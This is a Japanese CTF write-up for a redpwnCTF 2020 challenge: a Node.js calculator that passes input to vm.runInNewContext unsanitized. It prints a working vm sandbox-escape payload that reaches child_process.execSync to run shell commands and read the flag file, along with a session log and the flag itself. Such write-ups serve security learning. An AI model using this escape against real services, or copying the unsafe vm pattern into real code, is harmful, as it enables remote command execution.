# # <!--XXXXXXXXXX-->
Who needs regex for sanitization when we have VMs?!?!  
The flag is at /ctf/flag.txt  
nc 2020.redpwnc.tf 31273  
[calculator.js](calculator.js)  

# Solution
ncすると計算機のようだ。  
ソースは以下のようになっている。  
```JavaScript:calculator.js
const vm = require('vm')
const readline = require('readline')

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

process.stdout.write('Welcome to my Calculator-as-a-Service (CaaS)!\n')
process.stdout.write('This calculator lets you use the full power of Javascript for\n')
process.stdout.write('your computations! Try `Math.log(Math.expm1(5) + 1)`\n')
process.stdout.write('Type q to exit.\n')
rl.prompt()
rl.addListener('line', (input) => {
  if (input === 'q') {
    process.exit(0)
  } else {
    try {
      const result = vm.runInNewContext(input)
      process.stdout.write(result + '\n')
    } catch {
      process.stdout.write('An error occurred.\n')
    }
    rl.prompt()
  }
})
```
runInNewContextに直接inputが渡っているため、jsでRCEできないか考える。  
以下でRCE(ls -al)が可能となった。  
```JavaScript
const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('ls -al').toString()
```
問題文の通り/ctf/flag.txtを読む。  
```bash
$ nc 2020.redpwnc.tf 31273
Welcome to my Calculator-as-a-Service (CaaS)!
This calculator lets you use the full power of Javascript for
your computations! Try `Math.log(Math.expm1(5) + 1)`
Type q to exit.
> const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('cat /ctf/flag.txt').toString()
flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}

> q
```

## flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}